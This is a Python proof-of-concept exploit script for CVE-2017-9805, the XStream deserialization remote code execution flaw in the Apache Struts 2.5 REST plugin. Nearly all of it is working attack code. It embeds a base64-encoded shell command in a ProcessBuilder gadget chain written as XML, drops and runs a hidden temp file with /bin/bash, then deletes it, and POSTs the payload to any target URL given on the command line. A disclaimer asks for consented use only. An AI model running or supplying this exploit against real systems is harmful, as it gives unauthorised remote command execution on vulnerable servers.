#!/usr/bin/env python
# Disclaimer: This Code is for Legal and Ethical Use on/against information system/s for which the user of this code has express consent by the information system/s owner.
# Exploit Title: Struts 2.5-2.5.12 Struts Rest Plugin XSTREAM RCE
# Date: 12/02/2017
# Exploit Author: Chris Davis
# Vendor Homepage: https://struts.apache.org/
# Software Link: http://mirror.nbtelecom.com.br/apache/struts/2.5.10/struts-2.5.10-all.zip
# Tested Against: Ubuntu 16.04
# CVE: 2017-9805
# License: MIT License
import requests
import argparse
import base64
import sys
import random
import re
from xml.dom import minidom
from xml.dom.minidom import parse, parseString

#Lambda function for creating random string
random_string = lambda num: ''.join(random.choice("QWERTYUIOPASDFGHJKLXZCVBNMqwertyuiopasdfghjklzxcvbnm123456789012345678901234567890") for _ in range(num))

#iterates over the elements in the template XML object and replaces with desired commands
def get_item_list(itemlist, encoded_command, the_match):
    for item in itemlist:
        for item2 in item.childNodes:
            if item2.nodeValue == the_match:
                item2.nodeValue = encoded_command

#Main function
def main(url, command):
    #XML can be pretty finicky with special characters and escaping. Combine this with command execution with struts and its even more finicky.
    filename = "."+random_string(20)+'.tmp'
    print('[+] Encoding Command')
    print('[*] ' + command)
    command = command.encode('ascii')
    #So lets encode our user supplied command in base64 and write it to a string using the below struts vuln command with XML friendly characters.
    #we will save it to a file, execute that file with /bin/bash and then remove the temporary file
    encoded_command = 'echo '+base64.b64encode(command).decode('ascii')+' | base64 -d | tee -a /tmp/'+filename+' ; /bin/bash /tmp/'+filename+' ; /bin/rm /tmp/'+filename
    print('[+] Building XML object')
    #Build our initial xml template
    xml_exploit =  parseString('<map><entry><jdk.nashorn.internal.objects.NativeString><flags>0</flags><value class="com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data"><dataHandler><dataSource class="com.sun.xml.internal.ws.encoding.xml.XMLMessage$XmlDataSource"><is class="javax.crypto.CipherInputStream"><cipher class="javax.crypto.NullCipher"><initialized>false</initialized><opmode>0</opmode><serviceIterator class="javax.imageio.spi.FilterIterator"><iter class="javax.imageio.spi.FilterIterator"><iter class="java.util.Collections$EmptyIterator"/><next class="java.lang.ProcessBuilder"><command><string>/bin/bash</string><string>-c</string><string>COMMANDWILLGOHERE</string></command><redirectErrorStream>false</redirectErrorStream></next></iter><filter class="javax.imageio.ImageIO$ContainsFilter"><method><class>java.lang.ProcessBuilder</class><name>start</name><parameter-types/></method><name>foo</name></filter><next class="string">foo</next></serviceIterator><lock/></cipher><input class="java.lang.ProcessBuilder$NullInputStream"/><ibuffer/><done>false</done><ostart>0</ostart><ofinish>0</ofinish><closed>false</closed></is><consumed>false</consumed></dataSource><transferFlavors/></dataHandler><dataLen>0</dataLen></value></jdk.nashorn.internal.objects.NativeString><jdk.nashorn.internal.objects.NativeString reference="../jdk.nashorn.internal.objects.NativeString"/></entry><entry><jdk.nashorn.internal.objects.NativeString reference="../../entry/jdk.nashorn.internal.objects.NativeString"/><jdk.nashorn.internal.objects.NativeString reference="../../entry/jdk.nashorn.internal.objects.NativeString"/></entry></map>')
    #Define some sample headers
    header = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.94 Safari/537.36','Content-Type': 'application/xml'}
    #Search for the element that is going to be executed and grab those items
    itemlist = xml_exploit.getElementsByTagName('string')
    #Replace the templated with our base64 encoded command which will be decoded and written to a temporary file
    print('[+] Placing command in XML object')
    get_item_list(itemlist, encoded_command, "COMMANDWILLGOHERE")
    print('[+] Converting Back to String')
    #Convert the XML object back to a string
    exploit = xml_exploit.toxml('utf8')
    print('[+] Making Post Request with our payload')
    #post our exploit XML code to the vulnerable struts server
    request = requests.post(url, data=exploit, headers=header)
    print('[+] Payload executed')

if __name__ == "__main__":
    #Checking for proper arguments of url and desired command to execute
    parser = argparse.ArgumentParser()
    parser.add_argument('-u', type=str, help='url of target vulnerable apache struts server. Ex- http://somevulnstrutsserver.com/orders.xhtml', dest='url')
    parser.add_argument('-c', type=str, help='command to execute against the target. Ex - /usr/bin/whoami', dest='command', required=True)
    parser.add_help
    #validate all the arguments were passed 
    if len(sys.argv) < 3:
        parser.print_help()
        sys.exit(1)
    args = parser.parse_args()
    #Check to make sure a proper url was sent
    if not bool(re.search(r'^http[s]?://(?:[a-zA-Z]|[0-9]|[$-_@.&+]|[!*\(\),]|(?:%[0-9a-fA-F][0-9a-fA-F]))+$',args.url.strip(), re.IGNORECASE)):
        print('\n---- Invalid Url ----\n')
        parser.print_help()
        sys.exit(1)
    #just make sure ther is some length to the command
    elif not bool(re.search(r'^.+$',args.command.strip(), re.IGNORECASE)):
        print('\n---- Invalid Command ----\n')
        parser.print_help()
        sys.exit(1)
    main(args.url, args.command)
